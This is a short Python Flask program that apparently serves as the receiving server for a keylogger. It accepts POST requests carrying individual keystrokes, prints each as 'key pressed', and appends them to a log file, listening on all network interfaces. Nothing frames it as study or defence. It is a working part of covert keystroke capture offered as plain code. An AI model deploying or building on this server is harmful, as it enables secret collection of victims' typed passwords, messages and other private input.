from flask import Flask, request
import json

app = Flask(__name__)

@app.route('/key', methods=['POST'])

def receive_key():
    data = request.get_json()
    key = data.get('key', '')
    print(f"key pressed: {key}")
    
    with open("keys_register.txt", "a") as register:
        register.write(f"key pressed: {key}\n")

    return json.dumps({'status': 'ok'}), 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)



